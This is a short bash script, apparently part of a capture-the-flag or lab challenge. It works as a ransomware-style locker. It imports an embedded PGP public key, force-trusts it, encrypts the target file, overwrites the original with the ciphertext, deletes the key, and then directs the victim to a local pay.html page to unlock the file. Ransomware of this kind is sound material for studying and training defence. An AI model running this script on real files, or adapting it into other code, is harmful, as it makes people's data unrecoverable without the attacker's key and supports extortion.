#!/bin/bash

dir=$(dirname $0)
file=$1
if [ ! -f "$file" ]; then
    echo "Usage: $0 <file_to_be_viewed>"
    echo
    echo "Error: $file is not a file."
    exit 1
fi

pub="-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: GnuPG v1

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
=vPnV
-----END PGP PUBLIC KEY BLOCK-----"

echo "$pub" > turkey.pub
gpg --quiet --batch --yes --import turkey.pub
rm turkey.pub
gpg --quiet --batch --yes --trust-model always --output ${file}.crypt --recipient "Turkey Jam" --encrypt $file
mv ${file}.crypt $file
gpg --quiet --batch --yes --delete-key "Turkey Jam"

echo "Congratulations! The file is locked!"
echo "Friendly suggestion: don't lock it twice."
echo "Visit http://0.0.0.0:10030/pay.html to unlock!"